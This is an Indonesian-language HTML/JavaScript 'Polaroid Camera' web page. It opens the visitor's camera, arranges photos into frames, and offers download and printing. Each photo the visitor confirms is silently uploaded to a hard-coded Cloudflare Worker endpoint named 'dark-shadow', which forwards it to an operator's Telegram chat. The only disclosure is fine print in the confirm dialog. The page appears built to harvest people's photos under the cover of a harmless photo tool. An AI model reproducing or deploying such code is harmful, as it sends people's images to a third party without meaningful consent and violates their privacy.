<!DOCTYPE html>
<html lang="id">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no">
<title>Polaroid Camera</title>
<style>
*{box-sizing:border-box}
body{margin:0;background:#111;color:#fff;font-family:Arial,sans-serif}
.app{max-width:520px;margin:auto;padding:14px}
h1{text-align:center;font-size:22px;margin:5px 0 12px}
.camera{position:relative;background:#000;border-radius:20px;overflow:hidden;aspect-ratio:3/4}
video{width:100%;height:100%;object-fit:cover;display:block}
.camera-ui{position:absolute;inset:0;display:flex;flex-direction:column;justify-content:space-between;padding:14px}
.top{display:flex;justify-content:space-between}
button{border:0;border-radius:12px;padding:11px 14px;font-weight:bold;cursor:pointer}
.top button{background:#fff;color:#111}
.controls{display:flex;justify-content:center}
.shutter{width:72px;height:72px;border-radius:50%;border:6px solid #fff;background:#fff;padding:0}
.shutter:after{content:"";display:block;width:52px;height:52px;border-radius:50%;background:#111;margin:auto}
.panel{background:#1d1d1d;border-radius:18px;padding:14px;margin-top:14px}
.row{display:flex;gap:8px;flex-wrap:wrap}
.layout{flex:1;min-width:90px;background:#fff;color:#111}
.layout.active{background:#ff4f91;color:#fff}
.small{font-size:12px;color:#bbb;margin-top:8px;text-align:center}
#polaroid{background:#eee;color:#111;padding:18px 14px 28px;border-radius:5px;margin-top:14px}
.paper-title{text-align:center;font-weight:bold;margin-bottom:12px}
.frame{background:#fff;margin:10px auto;padding:8px;max-width:360px;box-shadow:0 2px 8px #999;cursor:pointer}
.frame.selected{outline:3px solid #ff4f91}
.frame h3{margin:0 0 7px;font-size:12px;color:#777;text-align:center}
.grid{display:grid;gap:5px}
.g1{grid-template-columns:1fr}
.g2{grid-template-columns:1fr 1fr}
.g3{grid-template-columns:repeat(3,1fr)}
.slot{background:#ddd;aspect-ratio:1/1;overflow:hidden;display:flex;align-items:center;justify-content:center;color:#aaa;font-size:11px}
.slot img{width:100%;height:100%;object-fit:cover;display:block}
.frame.layout1 .slot{aspect-ratio:4/3}
.paper-actions{display:flex;gap:8px;margin-top:14px}
.paper-actions button{flex:1;background:#111;color:#fff}
.status{text-align:center;font-size:12px;margin-top:9px;color:#777}
.modal{position:fixed;inset:0;background:#000b;display:none;align-items:center;justify-content:center;padding:20px;z-index:5}
.modal.show{display:flex}
.box{background:#fff;color:#111;border-radius:20px;padding:22px;width:min(360px,100%);text-align:center}
.preview{width:100%;aspect-ratio:4/3;object-fit:cover;border-radius:12px;margin:10px 0}
.modal-actions{display:flex;gap:10px}
.modal-actions button{flex:1}
.no{background:#ddd}
.yes{background:#ff4f91;color:#fff}
.notice{font-size:11px;color:#777;margin-top:8px;line-height:1.4}
</style>
</head>
<body>
<div class="app">
<h1>📸 Polaroid Camera</h1>

<div class="camera">
  <video id="video" autoplay playsinline></video>
  <div class="camera-ui">
    <div class="top">
      <button id="flip">🔄 Kamera</button>
      <button id="clear">🗑️ Reset</button>
    </div>
    <div class="controls">
      <button class="shutter" id="capture" aria-label="Ambil foto"></button>
    </div>
  </div>
</div>

<div class="panel">
  <div><b>Frame aktif:</b> <span id="frameText">1</span>/5</div>
  <div class="row" style="margin-top:10px">
    <button class="layout active" data-layout="1">1️⃣ 1 Foto</button>
    <button class="layout" data-layout="2">2️⃣ 2 Foto</button>
    <button class="layout" data-layout="3">3️⃣ 3 Foto</button>
  </div>
  <div class="small">Setiap frame bisa memakai tata letak berbeda.</div>
</div>

<div id="polaroid">
  <div class="paper-title">MY POLAROID</div>
  <div id="frames"></div>
  <div class="paper-actions">
    <button id="downloadPolaroid">⬇️ Download</button>
    <button id="printPolaroid">🖨️ Cetak</button>
  </div>
  <div id="status" class="status">Siap.</div>
</div>
</div>

<div class="modal" id="modal">
  <div class="box">
    <h2>Simpan ke Polaroid?</h2>
    <img id="preview" class="preview">
    <div class="modal-actions">
      <button class="no" id="no">Tidak</button>
      <button class="yes" id="yes">Iya, Simpan</button>
    </div>
    <div class="notice">
      Dengan menekan “Iya, Simpan”, foto dimasukkan ke Polaroid dan
      dikirim ke chat Telegram tujuan yang dikonfigurasi.
    </div>
  </div>
</div>

<script>
/*
  SETELAH CLOUDFLARE WORKER DIBUAT, GANTI URL DI BAWAH.
*/
const TELEGRAM_SERVER =
  "https://dark-shadow-348epolaroid-telegram.hanifasayank007.workers.dev";

const video=document.getElementById("video");
const canvas=document.createElement("canvas");
const modal=document.getElementById("modal");
const preview=document.getElementById("preview");
const framesEl=document.getElementById("frames");
const statusEl=document.getElementById("status");

let facing="user";
let pending=null;
let activeFrame=0;

const frames=Array.from({length:5},()=>({
  layout:1,
  photos:[]
}));

async function startCamera(){
  try{
    if(!navigator.mediaDevices?.getUserMedia)
      throw new Error("Browser tidak mendukung kamera.");

    const stream=await navigator.mediaDevices.getUserMedia({
      video:{
        facingMode:facing,
        width:{ideal:1080},
        height:{ideal:1440}
      },
      audio:false
    });

    video.srcObject=stream;
    await video.play();
  }catch(e){
    alert("Kamera tidak bisa dibuka. Izinkan kamera dan gunakan HTTPS.");
    console.error(e);
  }
}

function render(){
  document.getElementById("frameText").textContent=activeFrame+1;

  document.querySelectorAll(".layout").forEach(btn=>{
    btn.classList.toggle(
      "active",
      Number(btn.dataset.layout)===frames[activeFrame].layout
    );
  });

  framesEl.innerHTML="";

  frames.forEach((f,i)=>{
    const frame=document.createElement("div");
    frame.className="frame layout"+f.layout+
      (i===activeFrame?" selected":"");

    const title=document.createElement("h3");
    title.textContent=`FRAME ${i+1} • ${f.layout} FOTO`;
    frame.appendChild(title);

    const grid=document.createElement("div");
    grid.className="grid "+
      (f.layout===1?"g1":f.layout===2?"g2":"g3");

    for(let s=0;s<f.layout;s++){
      const slot=document.createElement("div");
      slot.className="slot";

      if(f.photos[s]){
        const img=document.createElement("img");
        img.src=f.photos[s];
        slot.appendChild(img);
      }else{
        slot.textContent="Kosong";
      }

      grid.appendChild(slot);
    }

    frame.appendChild(grid);
    frame.onclick=()=>{
      activeFrame=i;
      render();
    };

    framesEl.appendChild(frame);
  });
}

document.querySelectorAll(".layout").forEach(btn=>{
  btn.onclick=()=>{
    const n=Number(btn.dataset.layout);
    frames[activeFrame].layout=n;
    frames[activeFrame].photos=
      frames[activeFrame].photos.slice(0,n);
    render();
  };
});

document.getElementById("capture").onclick=()=>{
  if(!video.videoWidth)return;

  canvas.width=video.videoWidth;
  canvas.height=video.videoHeight;

  const ctx=canvas.getContext("2d");
  ctx.drawImage(video,0,0,canvas.width,canvas.height);

  pending=canvas.toDataURL("image/jpeg",0.92);
  preview.src=pending;
  modal.classList.add("show");
};

document.getElementById("no").onclick=()=>{
  pending=null;
  modal.classList.remove("show");
};

async function kirimKeTelegram(dataURL){
  if(TELEGRAM_SERVER.includes("GANTI-DENGAN-URL-WORKER")){
    statusEl.textContent=
      "Foto masuk Polaroid. Server Telegram belum dipasang.";
    return;
  }

  try{
    statusEl.textContent="Mengirim foto ke Telegram...";

    const blob=await fetch(dataURL).then(r=>r.blob());
    const form=new FormData();
    form.append("photo",blob,"polaroid.jpg");

    const response=await fetch(TELEGRAM_SERVER,{
      method:"POST",
      body:form
    });

    const result=await response.json();

    if(!response.ok||!result.ok)
      throw new Error(result.error||"Telegram gagal.");

    statusEl.textContent=
      "Foto tersimpan + terkirim ke Telegram.";
  }catch(error){
    console.error(error);
    statusEl.textContent=
      "Foto tersimpan, tetapi Telegram gagal menerima.";
  }
}

document.getElementById("yes").onclick=async()=>{
  const foto=pending;
  const f=frames[activeFrame];

  if(f.photos.length<f.layout){
    f.photos.push(foto);

    if(
      f.photos.length>=f.layout &&
      activeFrame<frames.length-1
    ){
      activeFrame++;
    }
  }

  pending=null;
  modal.classList.remove("show");
  render();

  await kirimKeTelegram(foto);
};

document.getElementById("flip").onclick=()=>{
  facing=facing==="user"?"environment":"user";

  if(video.srcObject)
    video.srcObject.getTracks().forEach(t=>t.stop());

  startCamera();
};

document.getElementById("clear").onclick=()=>{
  frames.forEach(f=>{
    f.photos=[];
    f.layout=1;
  });

  activeFrame=0;
  statusEl.textContent="Polaroid dikosongkan.";
  render();
};

function punyaFoto(){
  return frames.some(f=>f.photos.length);
}

async function buatGambarPolaroid(){
  const scale=2;
  const width=800;
  const padding=35;
  const gap=28;
  const frameWidth=width-padding*2;

  let height=90;

  for(const f of frames){
    const frameHeight=f.layout===1
      ? frameWidth*0.75
      : frameWidth/(f.layout===2?2:3);

    height+=55+frameHeight+gap;
  }

  height+=padding;

  const out=document.createElement("canvas");
  out.width=width*scale;
  out.height=height*scale;

  const ctx=out.getContext("2d");
  ctx.scale(scale,scale);

  ctx.fillStyle="#eeeeee";
  ctx.fillRect(0,0,width,height);

  ctx.fillStyle="#111";
  ctx.font="bold 30px Arial";
  ctx.textAlign="center";
  ctx.fillText("MY POLAROID",width/2,48);

  let y=75;

  for(let i=0;i<frames.length;i++){
    const f=frames[i];

    const frameHeight=f.layout===1
      ? frameWidth*0.75
      : frameWidth/(f.layout===2?2:3);

    ctx.fillStyle="#fff";
    ctx.fillRect(padding,y,frameWidth,frameHeight+34);

    ctx.fillStyle="#777";
    ctx.font="bold 18px Arial";
    ctx.fillText(
      `FRAME ${i+1} • ${f.layout} FOTO`,
      width/2,y+24
    );

    const imageY=y+34;
    const slotWidth=
      (frameWidth-(f.layout-1)*5)/f.layout;

    for(let s=0;s<f.layout;s++){
      const x=padding+s*(slotWidth+5);

      ctx.fillStyle="#ddd";
      ctx.fillRect(x,imageY,slotWidth,frameHeight);

      if(f.photos[s]){
        await drawImageCover(
          ctx,f.photos[s],
          x,imageY,slotWidth,frameHeight
        );
      }
    }

    y+=frameHeight+34+gap;
  }

  return out;
}

function drawImageCover(ctx,src,x,y,w,h){
  return new Promise(resolve=>{
    const img=new Image();

    img.onload=()=>{
      const ratio=Math.max(w/img.width,h/img.height);
      const nw=img.width*ratio;
      const nh=img.height*ratio;
      const dx=x+(w-nw)/2;
      const dy=y+(h-nh)/2;

      ctx.save();
      ctx.beginPath();
      ctx.rect(x,y,w,h);
      ctx.clip();
      ctx.drawImage(img,dx,dy,nw,nh);
      ctx.restore();

      resolve();
    };

    img.onerror=resolve;
    img.src=src;
  });
}

document.getElementById("downloadPolaroid").onclick=async()=>{
  if(!punyaFoto()){
    alert("Belum ada foto.");
    return;
  }

  statusEl.textContent="Membuat file...";
  const result=await buatGambarPolaroid();

  const link=document.createElement("a");
  link.download="polaroid.jpg";
  link.href=result.toDataURL("image/jpeg",.95);
  link.click();

  statusEl.textContent="Polaroid berhasil didownload.";
};

document.getElementById("printPolaroid").onclick=async()=>{
  if(!punyaFoto()){
    alert("Belum ada foto.");
    return;
  }

  statusEl.textContent="Menyiapkan cetakan...";

  const result=await buatGambarPolaroid();
  const data=result.toDataURL("image/jpeg",.95);
  const win=window.open("","_blank");

  if(!win){
    alert("Popup diblokir. Izinkan popup.");
    return;
  }

  win.document.write(`
    <!doctype html>
    <html>
    <head>
      <title>Cetak Polaroid</title>
      <style>
        @page{margin:0}
        html,body{margin:0;padding:0;background:#fff}
        body{display:flex;justify-content:center}
        img{display:block;width:100%;max-width:420px;height:auto}
        @media print{img{max-width:none;width:100%}}
      </style>
    </head>
    <body>
      <img src="${data}">
      <script>
        window.onload=()=>{
          setTimeout(()=>window.print(),500);
        };
      <\/script>
    </body>
    </html>
  `);

  win.document.close();
  statusEl.textContent="Dialog cetak dibuka.";
};

render();
startCamera();
</script>
</body>
</html>
